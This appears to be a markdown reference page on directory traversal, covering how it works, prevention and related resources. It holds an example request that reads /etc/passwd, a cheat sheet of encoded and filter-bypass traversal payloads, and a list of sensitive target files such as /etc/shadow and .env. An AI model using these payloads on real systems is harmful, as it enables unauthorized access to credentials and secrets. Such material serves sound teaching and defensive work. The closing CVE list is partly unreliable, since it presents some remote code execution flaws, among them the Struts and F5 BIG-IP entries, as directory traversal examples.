# Directory Traversal / Path Traversal

## Overview
Directory traversal, also known as path traversal, is a security vulnerability that allows an attacker to access files and directories stored outside the intended web root folder. Exploiting this flaw may lead to unauthorized access to sensitive files, configuration files, or even system-level resources.

## How It Works
This vulnerability arises when user-supplied input is not properly sanitized before being used in file system operations. By injecting special characters like `../` (dot-dot-slash), attackers can manipulate file paths to traverse up the directory structure and access restricted files.

### Example Request
```
GET /files/../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
```

## 🔐 Payload Cheat Sheet

### Basic Traversals
- `../` — Unix-style path traversal
- `..\\` — Windows-style path traversal
- `../../etc/passwd` — Multi-level traversal
- `..%2F` — URL-encoded `../`
- `..%5C` — URL-encoded `..\\`

### Obfuscated / Filter Bypass Payloads
- `..%252f` — Double-encoded `../`
- `....//....//` — Trick filters into allowing traversal
- `....\\\\....\\\\` — Windows obfuscation
- `%2e%2e%2f` — Encoded `../`
- `%2e%2e/` — Alternative encoding
- `..%c0%af` — Unicode-encoded slash
- `../../../etc/passwd%00.png` — Null byte injection to bypass file extensions

## 🗂 Common Target Files
- `/etc/passwd` — Linux user accounts
- `/etc/shadow` — Linux password hashes
- `/proc/self/environ` — Environment variables
- `.env` — Environment configuration (contains secrets)
- `WEB-INF/web.xml` — Java web app config
- `C:\Windows\win.ini` — Windows system config

## 💥 Impact
- Disclosure of sensitive configuration files
- Leakage of credentials or API keys
- Access to application source code
- Information leakage about server or environment
- Possibility of remote code execution (via chained exploits)

## 🛡️ Prevention

1. **Sanitize and Validate Input**  
   - Reject dangerous characters and patterns like `../`, `%00`, or encoded traversal sequences.  
   - Use allow-lists for filenames and extensions.

2. **Use Secure File APIs**  
   - Normalize file paths using secure functions (e.g., `realpath()` in PHP or Python).

3. **Enforce Access Controls**  
   - Restrict file access using file system permissions and sandboxing techniques.

4. **Monitor and Log Access**  
   - Log all file access attempts and monitor for repeated suspicious behavior.

5. **Perform Regular Audits**  
   - Conduct regular penetration testing, source code reviews, and use static analysis tools.

## 📚 Resources
- [PortSwigger - Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP - Directory Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Acunetix - Directory Traversal](https://www.acunetix.com/websitesecurity/directory-traversal/)

## 🧨 CVE Examples
- [CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638) - Apache Struts
- [CVE-2021-22986](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22986) - F5 BIG-IP
- [CVE-2020-1938](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938) - Apache Tomcat (Ghostcat)
- [CVE-2020-36289](https://nvd.nist.gov/vuln/detail/CVE-2020-36289) - OpenAsset traversal with `....//....//`

---
